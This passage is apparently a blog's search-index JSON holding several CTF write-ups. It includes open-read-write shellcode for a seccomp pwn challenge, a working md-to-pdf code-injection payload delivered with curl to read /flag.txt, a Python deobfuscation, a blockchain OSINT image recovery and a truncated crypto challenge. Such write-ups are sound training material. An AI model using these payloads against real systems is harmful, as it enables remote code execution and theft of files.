‘read’, declared with attribute warn_unused_result [-Wunused-result] 10 | read(fd, data, 100); | ^~~~~~~~~~~~~~~~~~~ test.c:11:2: warning: ignoring return value of ‘write’, declared with attribute warn_unused_result [-Wunused-result] 11 | write(1, data, 100); | ^~~~~~~~~~~~~~~~~~~ $ ./test HTB{f4k3_fl4g_f0r_t3st1ng}  This is the generated assembly code (optimized due to -O3 flag in gcc). This is known as open-read-write shellcode:\n$ objdump -M intel --disassemble=main test test: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000010c0 \u0026lt;main\u0026gt;: 10c0: f3 0f 1e fa endbr64 10c4: 55 push rbp 10c5: 31 f6 xor esi,esi 10c7: 48 8d 3d 36 0f 00 00 lea rdi,[rip+0xf36] # 2004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 10ce: 48 81 ec 10 01 00 00 sub rsp,0x110 10d5: 64 48 8b 04 25 28 00 mov rax,QWORD PTR fs:0x28 10dc: 00 00 10de: 48 89 84 24 08 01 00 mov QWORD PTR [rsp+0x108],rax 10e5: 00 10e6: 31 c0 xor eax,eax 10e8: 48 89 e5 mov rbp,rsp 10eb: e8 b0 ff ff ff call 10a0 \u0026lt;open@plt\u0026gt; 10f0: ba 64 00 00 00 mov edx,0x64 10f5: 48 89 ee mov rsi,rbp 10f8: 89 c7 mov edi,eax 10fa: e8 91 ff ff ff call 1090 \u0026lt;read@plt\u0026gt; 10ff: bf 01 00 00 00 mov edi,0x1 1104: ba 64 00 00 00 mov edx,0x64 1109: 48 89 ee mov rsi,rbp 110c: e8 6f ff ff ff call 1080 \u0026lt;write@plt\u0026gt; 1111: 31 ff xor edi,edi 1113: e8 98 ff ff ff call 10b0 \u0026lt;exit@plt\u0026gt; Disassembly of section .fini:  This is great, but let\u0026rsquo;s do the same with syscall instructions:\npush rsi mov rdi, 'flag.txt' # as hexadecimal number push rdi mov rdi, rsp mov al, 2 syscall mov dl, 0x64 mov rsi, rsp xor edi, eax xor al, al syscall mov al, 1 mov rdi, rax syscall mov al, 0x3c syscall  Notice how I set $rdi to the pointer to \u0026quot;flag.txt\\0\u0026quot;, and also how the registers for sys_write are still configured from the previous sys_read. I also optimized a bit the use of registers so that the generated shellcode is shorter.\nIf we enter the above shellcode in the blacksmith program, we will get the flag:\n$ python3 solve.py 134.209.26.70:31965 [*] './blacksmith' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments [+] Opening connection to 134.209.26.70 on port 31965: Done [+] HTB{s3cc0mp_1s_t00_s3cur3} [*] Closed connection to 134.209.26.70 port 31965  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/blacksmith/","section":"ctf","summary":"64-bit binary. seccomp rules. open-read-write shellcode","time":8,"title":"Blacksmith"},{"contents":"We have a website where we can write Markdown and transform the document to PDF:\nBy default, we have this Markdown content:\nAs we have a Node.js project, if we read package.json we can see the versions of the third-party dependencies:\n{ \"name\": \"blinker-fluids\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"start\": \"node index.js\" }, \"keywords\": [], \"author\": \"rayhan0x01\", \"license\": \"ISC\", \"dependencies\": { \"express\": \"4.17.3\", \"md-to-pdf\": \"4.1.0\", \"nunjucks\": \"3.2.3\", \"sqlite-async\": \"1.1.3\", \"uuid\": \"8.3.2\" }, \"devDependencies\": { \"nodemon\": \"^1.19.1\" } }  We notice that md-to-pdf version 4.1.0 has a critical vulnerability (snyk.io). We only need to use this payload:\n--js\\n((require(\"child_process\")).execSync(\"id  /tmp/RCE.txt\"))\\n---RCE  So we use it to copy the file flag.txt to the static/images directory:\nAnd we transforme it to PDF:\nHowever, it still does not work, so we can delete the file. Let\u0026rsquo;s try again using curl:\n$ curl 206.189.25.173:31956/api/invoice/add -d '{\"markdown_content\":\"---js\\n((require(\\\"child_process\\\")).execSync(\\\"cat /flag.txt \u0026gt; /app/static/images/flag.txt\\\"))\\n---RCE\"}' -H 'Content-Type: application/json' {\"message\":\"Invoice saved successfully!\"} $ curl 206.189.25.173:31956/api/invoice/list -s | jq [ { \"id\": 7, \"invoice_id\": \"5b364083-a15a-41d6-a9b3-6f8e20af96aa\", \"created\": \"2022-06-30 14:50:39\" }, { \"id\": 1, \"invoice_id\": \"f0daa85f-b9de-4b78-beff-2f86e242d6ac\", \"created\": \"2022-06-30 13:07:16\" } ]  And now it worked:\n$ curl 206.189.25.173:31956/static/images/flag.txt HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/blinkerfluids/","section":"ctf","summary":"Node.js. Third-party dependencies. Code Injection. RCE","time":1,"title":"BlinkerFluids"},{"contents":"We are given a Python script called bloat.flag.py:\nimport sys a = \"!\\\"#$%\u0026amp;'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+ \\ \"[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ \" def arg133(arg432): if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]: return True else: print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\ a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\ a[81]+a[68]+a[66]+a[83]) sys.exit(0) return·False def arg111(arg444): return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\\ a[75]+a[72]+a[78]+a[77]) def arg232(): return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\\ a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\\ a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\\ a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94]) def arg132(): return open('flag.txt.enc', 'rb').read() def arg112(): print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\\ a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\\ a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25]) def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) \u0026lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return \"\".join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(arg432,arg433)]) arg444 = arg132() arg432 = arg232() arg133(arg432) arg112() arg423 = arg111(arg444) print(arg423) sys.exit(0)  The key here is that the variable a contains printable characters as a string, and there are a lot of expressions that take some indeces of a. To read them, we can use them in a Python interactive session:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; a = \"!\\\"#$%\u0026'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\"+ \\ ... \"[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ \" \u0026gt;\u0026gt;\u0026gt; a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68] 'happychance' \u0026gt;\u0026gt;\u0026gt; a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\ ... a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\ ... a[81]+a[68]+a[66]+a[83] 'That password is incorrect' \u0026gt;\u0026gt;\u0026gt; a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\\ ... a[75]+a[72]+a[78]+a[77] 'rapscallion' \u0026gt;\u0026gt;\u0026gt; a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\\ ... a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\\ ... a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\\ ... a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94] 'Please enter correct password for flag: ' \u0026gt;\u0026gt;\u0026gt; a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\\ ... a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\\ ... a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25] 'Welcome back... your flag, user:'  We see that happychance is the key to enter in the decrypting function (and rapscallion is the cipher key). Now we can just enter happychance and get the flag:\n$ python3 bloat.flag.py Please enter correct password for flag: happychance Welcome back... your flag, user: picoCTF{d30bfu5c4710n_f7w_b8062eec}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/bloat.py/","section":"ctf","summary":"picoCTF 2022. 200 points. Deobfuscate Python script","time":2,"title":"bloat.py"},{"contents":"We are told that someone has been uploading images to Görli testnet (an Ethereum Blockchain) between 2020-07-30 and 2020-08-01. We need to find one image that contains the flag.\nTo interact with Görli we need to go to https://goerli.etherscan.io. We can find the range of block numbers within the dates specified manually going to https://goerli.etherscan.io/blocks/\u0026lt;number\u0026gt;. Poking around with the website, we find that https://goerli.etherscan.io/block/3134050 is the first block of the range and https://goerli.etherscan.io/block/3151326 is the last one (a total of 17276 blocks).\nBasically, blocks contain some transactions from one address to another. This blocks are chained into a Blockchain by a certain miner. Once a block is part of a Blockchain, it cannot be removed or modified.\nHence, we must find transactions inside the blocks that contain an image as input data. We know that PNG images start with 0x89504e47 (magic bytes) in hexadecimal.\nIn order to query all the blocks and the transactions on each of them, we are going to use web3 in Python:\n$ pip3 install web3  Then, we can interact with some RPC endpoints for Görli. I wrote this Python script to query every block in the range and looking if there is a transaction whose input data matches with the magic bytes for a PNG image:\n#!/usr/bin/env python3 import sys import time from requests.exceptions import ConnectionError, HTTPError from web3 import Web3 from web3.middleware import geth_poa_middleware w3 = Web3(Web3.HTTPProvider(sys.argv[1])) w3.middleware_onion.inject(geth_poa_middleware, layer=0) start = 3134050 end = 3151326 for n in range(start, end + 1): sys.stdout.write(f'Trying {n}. Progress: {100 * (n - start) / (end - start):2f}%\\r') try: block = dict(w3.eth.getBlock(n, True)) except (ConnectionError, HTTPError): print(f'Trying {n}. Progress: {100 * (n - start) / (end - start):2f}%') print('ERROR: Waiting for 10 seconds...') time.sleep(10) continue for transaction in map(dict, block['transactions']): if '89504e47' in transaction['input']: print('\\n\\nBlock Number:', n) print('From:', transaction['from']) exit()  If we run the script, after some hours we will get the matching block and the address of the sender:\n$ python3 find_tx.py https://rpc.goerli.mudit.blog Trying 3134136. Progress: 0.497800% ERROR: Waiting for 10 seconds... Trying 3135687. Progress: 9.475573% ERROR: Waiting for 10 seconds... ... Trying 3142336. Progress: 47.962491% ERROR: Waiting for 10 seconds... Trying 3142346. Progress: 48.020375% Block Number: 3142346 From: 0xb7e53a55da3eea0fbd09566afda143667d77527d  We see that the block number is 3142346. Now we can go to https://goerli.etherscan.io/block/3142346 to inspect the block:\nIt contains two transactions:\nOne of them contains the image in hexadecimal format:\nBut, this is not the full image (we can try it, but it does not show anything). Hence, we need to query for the transactions made from the address 0xb7e53a55da3eea0fbd09566afda143667d77527d:\nAnd there is one more transaction that comes from this address. This must be another part of the image:\nNotice that both hexadecimal input data start with 0x0. We must remove it to recover the PNG image properly. We can type the following commands:\n$ hex1=89504e470d0a1a0a0000000d494844520000001a00000213080600000019da0c2f0000183649444154789ced9d797c54d5d9c7efcd64df2793c9cc3df7ce9dc990909085cd4230614d30a834285b580a4211811ac3123581b204042b220101432029904c66fa795bb5da165fdb2a6f6dabd6da2a6dadb8b41f9757e962ad5b4520dbeffde3cc649b25f79eb9f145bd7ffc3e30e766e69bc93de7b9e7799e739ec371e255f85ce4fb4f7d7dfdb04807e9201da4831480e0e1fcd51ea95e833e839714801a2709aac50412338d014508012124e0b51e3703e8bfdb024b1429e8b156ff6b4cdf28987cdf48c9cf7e45415d0d4901e50305bac6042a974840f94081ae3181722a62558b09745995785cf6f07e9fa1cc04a9d02fe759f0cb7996e1074984400ad013350705ebf25716e82fabd3152b2c902c0a8a1516e8b62dbc627d31eed1150a124088ffa35c73d0c22a031656195841bc62757bc504fadd920cd56202d908a1122d0315a8dddbc604f2f5a46fdfc50f50a0f6b07a5db037076a0f0b244ad4b4c0ddef26bbfbfdf6be766f9b6863ecde59d9161042f06953df9cfa93c6280a12093e3a1c4ddb1e8806210439b98c9d6156692a082178729509704501edd1f8e1a274480e0b46e49ad13cd382cbdb53e1ba8efe420b2afc67418a4047b71b204a168c9508f68e23d85548304a14b0a0320eb7de120d9b6841a148601305c8b946fcfc30e338bae4e1704b8d01f6f149909c46c80529285d168d37da38fcdbcde1f6ed3cca564461c1b70cf85153608ba1d804757b38bcece2f0d3360ecfb5d3194fffeb9dde9f09f67ecd6d9de6a0eee3f1e83e1e3fcc20378fa532c1529900ee61047d7020ae77b0fea7313a7c50774b1c3aee4ac1c53a232ed4a6e1d33bd3f0bfebd251375e80e4b040b25b70789a151fd5a4e1426d1a3eab33e2f28e547437c503831e154141ef6c4bc29a2c82ab448211a2804cd18a4cd10abb688528a763f9cdd158b02c069264eebde614058c1609966712bc5997ac0c7473111de557cf8943d5161e1bb6f1d8b88d475d3d8fe6231c3e767378cfcde1fe063a8e366ce3b17e2b8f69f3634108c18a891665a07c3bbd076f9cf01fe5a1f4f6096a58f3ed4419c85e900cb920193d2ac74b8f87835c900c7ba1c23fddf3ed542c8333d07baf30cba0412c4811488b58902290e4340694cf3a04bac6040a160bf281025d63bb4741a42672f2150575362405940f14e81a13488b589022506e45ac6a3181d4c582fc67484c9da1eb4802ba9a12007784aa8ea31a74a38da05226786a7e06ba5bfcff449a817c1da0a822169b0a2c78afce08b8fd7d56cd40efbb39dcb12d0213c7a4e0e16b2de86a0c3dc76306c1439fa6bf3ac1a17471346eca31e3cd2a13e0f27f44a800f579dd7da0beb64f3d3cf6dec3636c51128e4fb6e2f2fe4436507f6fdb070ae4899f5a9881fc2c01b3ed8c03d626597ae503f56feb2f49b280488ca1ce1dbbf95ef940fddb0229ecce10ec09aa79f7fe791bd5b08382f5ca9e5331c305e2d1d3168d8bbb52f08b7916dc9e1bfa01a81ee48a42c7de643cbf38033b0a0826480264bb095933b4b00ced91e83c908497579a71ef7882293601b29c0ee794042cbacd80f6260eff18c2f353047aa048c02c8940b6a523b32411f3d71970e2010eefba437be2aa412221c8760a3858958ab74ec6040cfc69021a3b271672b611e3242b6a73097e35df828bbb52d0d31683c12e6458a04f3d1c1e3fc1e1d6cd1118756d1c64671a264802b6e6133c5b69c1e53d29802bb4d3acbad77de8e6f0503387159b22905d1a0fd96ec2d592809d855a776faf7a3c1cfee9e6d07694c3826f199059e2ff68d004d45fdd1e0e6f69d1bdb590ca27ec101fe88aa262053d31c78a27e65887043596a563df78820b01c2368a07aca8c06b58bb38018410fc786d0a1ba87742e2fbd304d1e93d346ab2ba88f151ee03dd332eb4768ca13f37420c33c02e7ba3294a1416c8171151a2f0eed1708fa3d17363307a6ee8398126a00eaf861da48514812e6f4f55a4b04105a21044c42bfa3a6cd0ba3ade4f37dfc1a3647134ec59e958362f156b3787f669c3ba471d1e0e3b3647e26a89e0b51a7ffba66967f8b08d7a18f30b435bf7b0411f34c453fb66d700f4af0d263fbdb7de84575699715b21b51ad3cbfce33faa410ec91250b22d03923d0df9e571f8c5310dc651208fae7e0f8fbdf772f8410b9d0d0df527beb22cc300b90d407b34958288c9d0a041f1ebeee6589c5b6946738980fa0282fa0282e61201e7569ad1dd3c744c2820e8e386381c9a28c07523b55f970ec5a1a68040160924671aec1313619f9808c999065924a82920b874284e3d68ff6cbaece6e09d74dab4bb3403222198589e80078f7378ad9deac1e31c8a66254024047bcafcb3c94382a6e6d0dcf8dbdfa593c6d176fafab78dfe93c8e71aa965189bc9605433ed561a946da58632272f7dc0ebfeea6835d0fc785eba7a5071094d07bc74670ae0e171fba62888b60c9cad360e8c3cba23f062b511a294819a8d81a7c2214147ea0d10e50c943b089ebcc18a3faf4ec7daebcc2891091e2a17f0ca2a335e5965c643e5565c6d23f866b919e7d6307ca34e0f87fa5d3c464c4980cd9106594a872c99217a257bd5ffb55d32b38da31e0f8777dc1c1e39c1a1e9304d1a0e256d2d03a3ae2c508f2b56b598409bb2886a3181ec5f4b0a28df9c3c501b13e895f6c0f27d68a0364d3b83e60b90be4220290344ca187ed0cebb79ecbc7be033ca519c08473163ca408dde72078e0b5d5926081e0e701bd0d598808edd29c3e788751e89c5892902e6cb0413250185411cb3b041f553e92c28737c0a165619b06eb3bf63b6ae2e74f44b112857a6b3a0c70ef18ac3cf4ca0fc31263a0b6a539712550ddab53912a26cc69f6f4f85d2f03313e8ef1b4ca89d67c22ca78033732df85b95bf63f6af0da6f0413ec74bf4a6d6ec411cb3b04143a5d982a5dbd8066c985206721bd48b0574bc58502d26902d27754849238d101d96f09e474fb942a8cd8033fb92b077be05e39c0224bb09f9b3fcbd3fe6ced0d31a830f371be19a2e60966c85233f05335744e1e4031c3e08fb79e48e40d703097879a5195b0b0414d8ccc89e9a8075b51178ba957a21e1f53a57142eec4cc1a3d75ab1c02ec0916dc4a4ca181cd84ff37c4a16fb2902dd3b9e60824420e75a50b93c193fde9f804f1b13d015424c205f4f1a2311ccb511cc572026902f1cad464ca00e0669d6bdd5ea2b0b8ae82725ed8ca01fcc147aa5a49d19e41b47c15c1425291f45a0d2e551bd52d2ce0ceaec2725ed5f845ea7837450af7413c408d24dd09709c4036e037a5c8cd32dff0f8b005cd1e83911878efb9270a1ce88d76f36e3c93956349708a80bb07a5011a8eb70222ed7a7e27c9509cf545ae02915b07bb480557601a5360123250b64c90c9b3d0d725e0aec9318c368153682312281c36e857d5c2a32672460f48d31285f19859b364560f34e1e870f7078f8048767db39bcc9ba14c431390192d388fc4c0b6e2f11f0c43732f0d1d654743425a0c7150525410e45a0f36e0e3f3ec161db5d3cae5d15899133e251989d8a4a7b06f68e13f0f38aa15741a9ee0c5d1e1eefb9a2f1f8fe44d4cc3721d32e400ab0eb9a09d4e38a41674312fe516dc2e31556ec2ab4e2ebf674e4e4a720e7da38cc591b788db76ad0965104d7480423b2ac9850918a9b6b6271f460247ed3cee3138fb2d09a22902d3b15a22d1df9360b6eb20bd85e20a0b958c04fae13f0fba519385f65c2c5ad4674ec4b42f7b178f6017ba68dc3771fe0f0ed5d3c965447a07851349c65f1b08f4b86dd9106bb6446ae68c5749b802532414db60671ef1e0fb5d61fba39fcc1c5e14727391c68e050bd85c7d76f8944e10d31704c66f46195aacb437781bcc31e67d09726ea4b130781f4a589aa415fc1a589212c82a6a07de309f68d1fa615ec6a3b8b72507b143aef4f44c73dc9e8b87ba07ca0fe6d4ca0ffec8bc777c611cc96084a2401570f920fd4bf8d0974e7649ae32b2c4dc092ea082cdb30503e50ff362650a1837ed09f9a79f478383ff940fddb984092d8f741c3da1944d904510e9e5a1beaba6290ab892ad8870c755db371a444ca40fa4e797da7fc9717a4ef94ff62ed9467d5150ef2adf71e6ed0eed104bb47ab9b8b33815826fd3a08f07070ce8c8773a6f20a55cca08fbd1a76108bb $ hex2=e6020dd110b09d21d311690ee883183be848ed8e70552ba4d35d46a694520a5db5443ad96560452ba4d35d46ae9b0ee91be4d754890be4d7558ee9152a97894078ef1680afaf4480c1a2709689b9d16f2c3fe5993827f549b8056c665d89e6534eeb3796de87daf2b1626c041089eddc8e8fe2ff81aadb7f5db8681bfe98bcb32f0e2b2be6d41a7f7d0a2c8eba73216401eeba4339d0f5a07b6cb8440eef7087fa7855a897101b6ac2a02c9de6dab1d27fabe51e709435fe4e4146def6ca533227b002ba10834e12aba13e4a52d7d7ffb3fd62541140588928073df4e023c3c5edb4ec3364545fe9d4611e8f65b6241448265a308feb5310def6f4ac3925c82af95a460d29414548e24387383154b72098828604735637af4ed360e634be3218a16384501234401b65c23be771f8f870ef0b08f4e8624992139d250ba3806efb3a6dee0e1f0868bc39d3b78cc5913896fac8fc08f9afa268acfb771387c80c3f78f73f8248839526d82ba3dca56ac870d62d5570cf4c96623ba8fc57bad76a0a5061a2d4d1c259bb1cc4ed03449c053f3ac7ea79768b634f1e07e1e05e571106d19014f2fd17469e23fdd1c76eee131666e0cf2e70c7c4c68be34111e3a590c54775d5f9a780582342fd63148ddc7e2f0d28a81c53a8e170bf8d34d19e83ec658ac63b03e3b1887aa5c0259140214eb10509d4770f17e86621d83b5cb5baca364763c1e6de1f07a3bd5232d1c8aafa3c53a769731d667e8af310e3a0b3adbe4bfacea85a6308a750c5676aeaf5887ffcdbf7c328c621d8355b3310aa29481df57f917eb78be8a16ebb8a3468308e4b935e95831d38c4912c183d7f415eb78b05c409144b062262dd6f1e6da81520db20728ce11a858c760a9062929d43154f18e2bd8047938d015d25ec7cced7bcc6b057247a0631f2d75fa70b98063c5020e4da0fffeb09cd60dead89f14b478b532509b013fbdc18252899a21d1960e29d30869442aa44c23445b3a6451409944f0c4dc0ca08dd1e3fbd90a236491c0969b8625d506341de670ba95c3936d3c4eb7f2683acc6149b501b61c5aa8e889958cd9ffebf2a87f746c8f61c072dedfad30e3859574bc747b3834eda156e2fa0246ff28d3bb25ffb3413be5f3332d2870f64dc12e781d31a7cce8f18d1e471db1d7eb5206f4b075350654ddeebb1f3c5edd9c42377f8ef30fe42a02d55647838856943b089e5b94814bdb53d1d990848ec389b8dc90844bdb53f1dca20c5ce32020a2155baafded9e22d0876e0ef36e89822d2b0d36d18ad122c12c89608e8dfe3b5a24b08956d8b28c58b02e121f87b395b8c3c3e191660e6b6a23306d5914f22a6291755d2cf22a62316d5914d6d646e0d1e6e0733c26cbd0e9199880ff824e20f5621d2c20bd580733482fd611de800d535716e8d2b65426a9068d1205af8857c15e0f946a50d51603e6979b20659a31797134d6d4f25853cb63f2e268489966ccbfc684aa2d06bfe34155839e5e95867c9160475de480a0c6650f87ed9b239127123cb32a74945f11687a36b5751fb6f977e10fbc19b1d2911a58ef4c272d94f2c961ff9d061f1fa2db4c9c4e0d06ececd989208460df142b3af627a1a72d163d6db1e8d89f84bd257472397bb606c5de9f3ec6216b42122451c04c1bc17a2755998d401205644d48c2335a64c4e0e170b695c3376b22905f110bc7d40438a62420af22162b6b2270b635344415081e1a86bee8a12731fcdd4dffaf34343d4c26c83ffe3a2ca040a7470f0b2850fc551dc81545bb766b5c48050ae82a03b90c7875753a1aae22a87612ac91438b19747a91094e91401a6942eeec58a67a348a40c523a8ad6bb92f029f79d8ead12802f9d60529f11ac21a47a2cd04d1167a3aa509e86423d5b083b49072909e946701e949793d29df2b3d29af098855573848dfa0a1837cd237685ce1a0e14ecac3158977aa4d689d4acf75db5948e09a26e0fc7a93a2699832509b01274badc81605d8c7f6ed93b0651b315224682bb506cc82a906fde29654d84482b2390938dbaf72fce9ef72183f23093691e0cc2a0d02ec8bafa29193a7bcd3adfe03f6f1fd7442327fac066b8973bd4775fcc7c5f9812eb8e8146b64802c986a50d648fa8d2e36fb7fa34f9be8a4313b87e1f091c19a39854e89cfed8e1b00ea698bc1430bcc2084a0729e7fa11bd5a07b37458310014df3d306806a7308468a02461625e185160dbaf7f9560ecb364460cb9d3465e0284e84634a0272af8fc5f28d06fc41cb5850ffcd316fb969e5aa0b9ee18c05e9eb82d480f47541cc207d5d90be2e28b0f473c44281f473c4984d907e8e987e8e5868901e8e6601e9e1683d1cdd2b3d1cad094877c4548174478c19a43b62ba23a683b400e927683082f4133474900ed202a49b2046906e8274d020853adc22c2eb9405df76a2ac333447e17fe65af1cc727fb7fe93bb92f1e82c0127a70878a6d282ae2381fd2445a0c7d7a5402204b72d1fb8fce3df7be331432690ec26484e236ca280d5b904971b198f5359554c634167ee191846db39d38cccbc74b43572387d92c3d4d9d4293b7a83ffe25945a0a291d4117bb7a5ef1ef4b44560ac9d60c3f2be8cf2d3f7d3104d692e6388c6ee2dc1d8d9de077a7b5f0c4442f0c3ed7d51928bde047d26eb36d5bc7c9a0fffdbbebe1bfde8ba148892156ff4fb96ef1fa661b4b163fcbd3f45a0a573e9068dbd53ade83a9c888e7d4958942fa064fac00a6fbfaea141a79b16301e1d75e6080f39d708891054d8084a6d0492d384efdf37f039f4adf224c805c9f8590363c14978383cdcc8e19a95511855118b294ba3d172d03f54f3a2f73c902ed671e493efec1c7f6bcd0fb9de8ecdd6b90de8698d45c7de64bc7bab09a7afb76267a116654edb23d1dd1c8f4b3b52f1d20a335cd305accf22986a1360b7a543ce4b41d64c0d42348726085866271863cb803dcb08c7e404942c89c6da5aba79fdd9760e1f0d515a4e11481a61842859b1ac3403a7b7a7e0fcc9587406d9e31f16e8b1931ceed8cea3b8321a578f4bc6fa5c331ebc46c0f92ae51b025475860eb701678fc5e1ee554664675a87dc5fa91ad4d9908437d7a6a37dba15abb24d183b291165cba350bf47f9965545a06b24028748b0a0cc84937725e28dd698e1b947795f8f855c988c6c5b3a66db046cce15f05f65025e5e61c6c56da9e86e4a005c1a0cd80b1e0e2fb473683ec2614d2d8f8995d1b01725c26e4f43816441a52c60cf98612880dce9e1f0d7760e0fb670a8abe751be320ace19a15779324eb70616ebe8f2f0784f8b010b0fa717eb6003e9c53af4621d03f4252bd6e136a8170be8d45441b59840a29ce6275f2023583b13e8fb2dfef27d60b0764d3a033cc13f901002c27ac2e0605d688cee0575f55b2bd4e9cd8ec9ac49f9feea6e8945539905a23d03442478751b4dc8c3c3e3ec1dd4044d9cc06882e0e180b6289cdf90869a3c6a0556ae8e46568109f3b3089eadb4e0e905165cefa47fb6da758c5ef9fb9b8dd83b5e40ae28402e4cc19a3b0cf8c0cde1be9d11b06553b7df260a209219932a62f177d6a4fc1891c036d2881bd746e2d9535cef33a9dbc3e191e31c6edb42eb35dcdfc0059d3b28024d5e148d478f05f6e4944af1bcaef7b59e945703d293f2cc203d29af27e5ff1f40ae085caa33e2d2b6c147d9f0e86a4cc0a5ad4674ec490979629022d01feb12e114092ae70c8c2cbebed18845990272442b8a248223570be86e09e3e4e8da9974c0fea45f38faf2b1284c7608285b1c8d0d5b79144e4b844808dc958117640607f53b3a72469e15a228e0fd937d6d8fdd9a82fcb1667ceca2af7fd31805221294e70901979a060535969870a4d884c3c526d845025922682c31f56a61ae1593b3337a5f3f5062822412d8c5be9f53046a6be2d0dac4e1d4510e0e6fbda093870cbda7ce148db1e0969be37a5f1fdf17094208b272cc387594be5ff53d2a2fa5d3a8dfac4b03daa3f1c1ddc9c8b259f1f4fd7d76efb7b53464bdb022f0491a8a40aeef4440b49b315ea24fd6ebec02ca2ae207cc216aca9261cb4ac5437bc38833747b38ecd9c32367561c1c531250be320aaf0d3a24f3d72e0e675c1a39621fb939bceb56e67885050a47ba09ea6dd34d906e827413c4060a474141ddc7e3d17d5c5d698450ef0d0a5a2a132c95d5157b808703dc81df1b14e41b3b9f1d5357fde3e2319a5dce742a2cc236631a1d3b0dc502ce7dd38cbfac4ec75f57a7e3ed75e9f86c7b2a3531ad51f864b3116fac49c75f56a7e3b59bcd383a8d86aea74f515870f27bf7f170142542924dbdde03f51a2c1823123c3cd70cd7f519c81105c8b68cdeeb92cd04fbb8649c1a349e42f6ba57db39788e733872907a07071b386cbd8bc7b8b244144804a36c04a5f362b1771fbd7ee800355b7f74f9679d99baf7ef8ef2bdd1add75b94a5df98405d1e0e724132e48264c5c5769907ecf3de047cd803566bf981eaebeb87453a4807e9201da40034ecfabc40ff075e830bf30ac0a4180000000049454e44ae426082 $ echo \"$hex1$hex2\" | xxd -r -p \u0026gt; flag.png  And we have the image with the flag:\n","image":"/images/osint.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/osint/block-hunt3r/","section":"ctf","summary":"Ethereum Görli testnet (Blockchain)","time":3,"title":"Block Hunt3r"},{"contents":"We are given this Python source code that encrypts the flag:\nfromCrypto.Util.numberimportbytes_to_long flag=open(\"flag.txt\", \"rb\").read().strip() TABLE=[ lambdaa, b: f\"({a}+{b})\", lambdaa, b: f\"({a}-{b})\", lambdaa, b: f\"({a}*{b})\", ] defbuild_box(s: bytes): e=\"(x)\" forbins: e=TABLE[b%len(TABLE)](e, b) returneval(f\"lambda x: {e}\") box=build_box(flag) ct=box(bytes_to_long(flag)) print(ct) print(box(1337)) print(box(0x1337)) \"\"\" Output: 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 3011454617406654839679120250 10002638090931457241529120250 \"\"\"  It is a strange way to encrypt a message. Basically, box is a set of operations that contain a single x, and then calling box with a given value means to substitute that value inside x and get the final result.\nWe can see how this box works:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; TABLE = [ ... lambda a, b: f\"({a}+{b})\", ... lambda a, b: f\"({a}-{b})\", ... lambda a, b: f\"({a}*{b})\", ... ] \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; def build_box(s: bytes): ... e = \"(x)\" ... for b in s: ... e = TABLE[b % len(TABLE)](e, b) ... return f\"lambda x: {e}\" ... \u0026gt;\u0026gt;\u0026gt; box = build_box(b'ictf{fake_flag}') \u0026gt;\u0026gt;\u0026gt; box 'lambda x: 